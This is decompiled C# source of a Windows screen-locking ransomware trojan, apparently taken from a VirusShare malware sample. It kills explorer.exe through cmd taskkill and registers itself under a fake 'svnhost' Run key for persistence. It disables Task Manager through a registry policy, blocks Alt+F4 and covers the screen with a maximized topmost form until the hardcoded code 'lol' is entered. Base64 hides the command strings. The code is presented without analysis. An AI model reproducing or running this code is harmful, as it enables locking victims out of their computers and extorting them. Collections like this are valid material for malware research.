// Decompiled with JetBrains decompiler
// Type: lock.Form1
// Assembly: lock, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E36EC1F9-E166-456D-9C77-1986444ECDB6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.MSIL.Agent.p-917a2f6be43e6cb085b227338b79e02f08cea424.exe

using @lock;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace @lock
{
  public class Form1 : Form
  {
    private IContainer components;
    private Button button1;
    private TextBox textBox1;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.button1 = new Button();
      this.textBox1 = new TextBox();
      this.SuspendLayout();
      this.button1.Anchor = AnchorStyles.Bottom;
      this.button1.Location = new Point(326, 527);
      this.button1.Name = "button1";
      this.button1.Size = new Size(124, 36);
      this.button1.TabIndex = 0;
      this.button1.Text = "Разблокировать";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.textBox1.Anchor = AnchorStyles.Bottom;
      this.textBox1.Location = new Point(326, 501);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(124, 20);
      this.textBox1.TabIndex = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(800, 600);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.button1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.TopMost = true;
      this.WindowState = FormWindowState.Maximized;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public Form1()
    {
      this.InitializeComponent();
      this.KeyPreview = true;
    }

    protected override void OnKeyDown(KeyEventArgs e)
    {
      base.OnKeyDown(e);
      if (e.KeyCode != Keys.F4 || !e.Alt)
        return;
      e.Handled = true;
    }

    public static string vivaliva(string data)
    {
      try
      {
        Decoder decoder = new UTF8Encoding().GetDecoder();
        byte[] bytes = Convert.FromBase64String(data);
        char[] chars = new char[decoder.GetCharCount(bytes, 0, bytes.Length)];
        decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
        return new string(chars);
      }
      catch (Exception ex)
      {
        throw new Exception("Error in base64Decode" + ex.Message);
      }
    }

    public static string db_ret(int id)
    {
      string str = "";
      if (id == 1)
        str = Form1.vivaliva("c3ZuaG9zdA==");
      if (id == 2)
        str = Form1.vivaliva("ZmdyZWVmbg==");
      if (id == 3)
        str = Form1.vivaliva("U29mdHdhcmVcXE1pY3Jvc29mdFxc");
      if (id == 4)
        str = Form1.vivaliva("XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFw=");
      if (id == 5)
        str = Form1.vivaliva("dGFza2tpbGw=");
      if (id == 6)
        str = Form1.vivaliva("Y21kLmV4ZQ==");
      if (id == 7)
        str = Form1.vivaliva("L0Mg");
      if (id == 8)
        str = Form1.vivaliva("IC9mIC9pbSBleHBsb3Jlci5leGU=");
      return str;
    }

    public static void pitstip() => Application.Exit();

    public static void refactor()
    {
      string str = "1";
      string subkey = "Software\\Microsoft\\Win" + "dows\\CurrentVersion\\Policies\\System";
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(subkey);
        subKey.SetValue("DisableTaskMgr", (object) str);
        subKey.Close();
      }
      catch (Exception ex)
      {
        if (34 <= Screen.PrimaryScreen.Bounds.Width)
          return;
        Form1.pitstip();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string str = Form1.db_ret(5);
      Process.Start(Form1.db_ret(6), Form1.db_ret(7) + str + Form1.db_ret(8));
      string name = Form1.db_ret(1);
      string executablePath = Application.ExecutablePath;
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey(Form1.db_ret(3) + Form1.db_ret(4));
      try
      {
        subKey.SetValue(name, (object) executablePath);
        subKey.Close();
      }
      catch
      {
        if (Control.DefaultBackColor.ToString() == Form1.db_ret(2))
        {
          int num = (int) MessageBox.Show("Error");
        }
      }
      Form1.refactor();
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (!(this.textBox1.Text == "lol"))
        return;
      Process.Start("C:\\Windows\\explorer.exe");
      RegistryKey subKey1 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
      try
      {
        string str = "nho";
        subKey1.DeleteValue("sv" + str + "st");
        subKey1.Close();
      }
      catch
      {
      }
      string str1 = "ftware";
      int num = 5;
      string subkey = "So" + str1 + "\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
      try
      {
        RegistryKey subKey2 = Registry.CurrentUser.CreateSubKey(subkey);
        subKey2.SetValue("DisableTaskMgr", (object) (num - 5).ToString());
        subKey2.Close();
      }
      catch (Exception ex)
      {
      }
      Application.Exit();
    }
  }
}
